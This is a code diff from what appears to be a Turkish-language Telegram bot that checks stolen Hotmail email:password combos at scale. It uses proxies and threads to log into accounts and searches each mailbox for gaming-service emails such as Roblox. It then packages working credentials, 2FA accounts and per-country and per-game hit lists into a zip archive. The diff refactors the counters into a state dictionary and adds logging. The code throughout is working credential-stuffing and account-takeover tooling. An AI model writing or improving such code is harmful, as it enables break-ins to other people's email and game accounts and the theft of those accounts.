@@ -614,7 +614,7 @@ class marazali:
         self.profil_cek(token)
         time.sleep(0.3)
         mesaj_info = {}
-        for game_key, game_data in GAME_EMAILS.items():
+        for game_key in GAME_EMAILS:
             sayi, tarih, subj, prev = self.search_messages(tag, game_key, token)
             mesaj_info[game_key] = {"sayi": sayi, "tarih": tarih, "subject": subj, "preview": prev}
             time.sleep(0.2)
@@ -806,7 +806,7 @@ def bakim(chat_id):
 
 
 # ============================================================
-# TARAMA — RAM TABANLI
+# TARAMA — STATE TABANLI
 # ============================================================
 
 def tarama_yap(chat_id, accounts, dosya_adi):
@@ -820,13 +820,15 @@ def tarama_yap(chat_id, accounts, dosya_adi):
     baslangic = time.time()
     tarama_durdur[chat_id] = False
 
-    egriegri = {"checked": 0, "hit": 0, "bad": 0, "twofa": 0, "errors": 0}
-    keyword_sayaci = {}
-    ulke_sayaci = {}
-    ulke_icerik = {}
-    keyword_icerik = {}
-    twofa_icerik = []
-    all_hits_icerik = []
+    state = {
+        "checked": 0, "hit": 0, "bad": 0, "twofa": 0, "errors": 0,
+        "keyword_sayaci": {},
+        "ulke_sayaci": {},
+        "ulke_icerik": {},
+        "keyword_icerik": {},
+        "twofa_icerik": [],
+        "all_hits_icerik": [],
+    }
 
     lock = threading.Lock()
     semaphore = threading.BoundedSemaphore(thread_sayisi)
@@ -845,23 +847,26 @@ def tarama_yap(chat_id, accounts, dosya_adi):
             formatted_proxy = format_proxy(proxy_str) if proxy_str else None
             c = marazali(email, password, formatted_proxy)
             status, mesaj_info = c.check(tag)
+
             with lock:
                 if status == "SUCCESS":
-                    egriegri["hit"] += 1
+                    state["hit"] += 1
                     ulke = (c.country or "Unknown").upper().strip()
                     if not ulke or len(ulke) > 3:
                         ulke = "Unknown"
                     isim = c.name or ""
-                    ulke_sayaci[ulke] = ulke_sayaci.get(ulke, 0) + 1
-                    all_hits_icerik.append(combo)
+                    state["ulke_sayaci"][ulke] = state["ulke_sayaci"].get(ulke, 0) + 1
+                    state["all_hits_icerik"].append(combo)
+
                     if mesaj_info:
-                        for game_key, game_data in mesaj_info.items():
-                            sayi = game_data.get("sayi", 0)
-                            if sayi > 0:
-                                tarih = game_data.get("tarih", "N/A")
-                                subj = game_data.get("subject", "")
-                                prev = game_data.get("preview", "")
-                                keyword_sayaci[game_key] = keyword_sayaci.get(game_key, 0) + 1
+                        for game_key, m_info in mesaj_info.items():
+                            sayi = m_info.get("sayi", 0)
+                            if sayi and sayi > 0:
+                                tarih = m_info.get("tarih", "N/A")
+                                subj = m_info.get("subject", "")
+                                prev = m_info.get("preview", "")
+                                state["keyword_sayaci"][game_key] = state["keyword_sayaci"].get(game_key, 0) + 1
+
                                 if game_key == "roblox":
                                     kullanici = roblox_eruu(prev + " " + subj)
                                     if kullanici:
@@ -876,29 +881,29 @@ def tarama_yap(chat_id, accounts, dosya_adi):
                                                  f"Username = ??? | Friends = ??? | Banned = ??? | "
                                                  f"Created = ??? | Profile = ??? | Wearing = []")
                                 else:
-                                    lbl = game_data["label"]
+                                    lbl = GAME_EMAILS[game_key]["label"]
                                     satir = f"{combo} | {ulke} | {isim} | {lbl} Messages: {sayi} | Last: {tarih}"
                                     if subj:
                                         satir += f" | Subject: {subj}"
                                     if prev:
                                         satir += f" | Preview: {prev}"
-                                if game_key not in keyword_icerik:
-                                    keyword_icerik[game_key] = []
-                                keyword_icerik[game_key].append(satir)
-                                if ulke not in ulke_icerik:
-                                    ulke_icerik[ulke] = []
-                                ulke_icerik[ulke].append(satir)
+
+                                state["keyword_icerik"].setdefault(game_key, []).append(satir)
+                                state["ulke_icerik"].setdefault(ulke, []).append(satir)
+                                print(f"[HIT] {game_key} | {ulke} | {combo}", flush=True)
+
                 elif status == "2FA":
-                    egriegri["twofa"] += 1
-                    twofa_icerik.append(combo)
+                    state["twofa"] += 1
+                    state["twofa_icerik"].append(combo)
                 else:
-                    egriegri["bad"] += 1
-        except Exception:
+                    state["bad"] += 1
+        except Exception as e:
             with lock:
-                egriegri["errors"] += 1
+                state["errors"] += 1
+            print(f"[CHECK ERROR] {e}", flush=True)
         finally:
             with lock:
-                egriegri["checked"] += 1
+                state["checked"] += 1
             semaphore.release()
 
     def progress_updater():
@@ -907,16 +912,16 @@ def tarama_yap(chat_id, accounts, dosya_adi):
             if tarama_durdur.get(chat_id, False):
                 break
             with lock:
-                checked = egriegri["checked"]
+                checked = state["checked"]
             if checked >= dogrudogru:
                 break
             with lock:
-                hit = egriegri["hit"]
-                twofa = egriegri["twofa"]
-                bad = egriegri["bad"]
-                errors = egriegri["errors"]
-                kw_copy = dict(keyword_sayaci)
-                ulke_copy = dict(ulke_sayaci)
+                hit = state["hit"]
+                twofa = state["twofa"]
+                bad = state["bad"]
+                errors = state["errors"]
+                kw_copy = dict(state["keyword_sayaci"])
+                ulke_copy = dict(state["ulke_sayaci"])
             elapsed = time.time() - baslangic
             yuzde = (checked / dogrudogru) * 100 if dogrudogru > 0 else 0
             cpm = (checked / elapsed) * 60 if elapsed > 0 else 0
@@ -959,41 +964,56 @@ def tarama_yap(chat_id, accounts, dosya_adi):
     for t in threads:
         t.join()
 
+    print(f"[ZIP] all_hits={len(state['all_hits_icerik'])} 2fa={len(state['twofa_icerik'])} ulke={len(state['ulke_icerik'])} keyword={len(state['keyword_icerik'])}", flush=True)
+
     tarih = datetime.now().strftime('%d-%m-%Y')
     try:
         with zipfile.ZipFile(ZIP_FILE, 'w', zipfile.ZIP_DEFLATED) as zf:
-            if all_hits_icerik:
+            buf = io.StringIO()
+            for line in state["all_hits_icerik"]:
+                buf.write(line + "\n")
+            zf.writestr("all_hits.txt", buf.getvalue())
+
+            if state["twofa_icerik"]:
                 buf = io.StringIO()
-                for line in all_hits_icerik:
-                    buf.write(line + "\n")
-                zf.writestr("all_hits.txt", buf.getvalue())
-            if twofa_icerik:
-                buf = io.StringIO()
-                for line in twofa_icerik:
+                for line in state["twofa_icerik"]:
                     buf.write(line + "\n")
                 zf.writestr("2fa.txt", buf.getvalue())
-            for kod, satirlar in ulke_icerik.items():
+
+            for kod, satirlar in state["ulke_icerik"].items():
                 buf = io.StringIO()
                 for line in satirlar:
                     buf.write(line + "\n")
-                n = ulke_sayaci.get(kod, len(satirlar))
-                zf.writestr(f"countries/{kod} ({n} hit) ({tarih}).txt", buf.getvalue())
-            for svc, satirlar in keyword_icerik.items():
+                n = state["ulke_sayaci"].get(kod, len(satirlar))
+                arc = f"countries/{kod} ({n} hit) ({tarih}).txt"
+                zf.writestr(arc, buf.getvalue())
+                print(f"[ZIP+] {arc} ({len(satirlar)} lines)", flush=True)
+
+            for svc, satirlar in state["keyword_icerik"].items():
                 buf = io.StringIO()
                 for line in satirlar:
                     buf.write(line + "\n")
-                n = keyword_sayaci.get(svc, len(satirlar))
-                zf.writestr(f"keywords/{svc} ({n} hit) ({tarih}).txt", buf.getvalue())
+                n = state["keyword_sayaci"].get(svc, len(satirlar))
+                arc = f"keywords/{svc} ({n} hit) ({tarih}).txt"
+                zf.writestr(arc, buf.getvalue())
+                print(f"[ZIP+] {arc} ({len(satirlar)} lines)", flush=True)
     except Exception as e:
         print(f"[ZIP ERROR] {e}", flush=True)
 
-    ozet = f"✔️ {egriegri['hit']}x Hotmail Hit\n\n"
-    ozet += f"📊 Toplam Hit: {egriegri['hit']}\n"
-    for k, v in sorted(keyword_sayaci.items(), key=lambda x: -x[1]):
+    try:
+        with zipfile.ZipFile(ZIP_FILE, 'r') as zf_check:
+            names = zf_check.namelist()
+            print(f"[ZIP VERIFY] {len(names)} entries: {names}", flush=True)
+    except Exception as e:
+        print(f"[ZIP VERIFY ERROR] {e}", flush=True)
+
+    ozet = f"✔️ {state['hit']}x Hotmail Hit\n\n"
+    ozet += f"📊 Toplam Hit: {state['hit']}\n"
+    for k, v in sorted(state["keyword_sayaci"].items(), key=lambda x: -x[1]):
         lbl = GAME_EMAILS[k]["label"] if k in GAME_EMAILS else k
         ozet += f"🎯 {lbl} Hit: {v}\n"
-    ozet += f"🌐 Toplam Ülke: {len(ulke_sayaci)}\n"
-    ozet += f"🔒 2FA: {egriegri['twofa']}\n\n"
+    ozet += f"🌐 Toplam Ülke: {len(state['ulke_sayaci'])}\n"
+    ozet += f"🔒 2FA: {state['twofa']}\n\n"
     ozet += f"🔥 Hit By : @imkansizligim"
     send_message(chat_id, ozet)
 
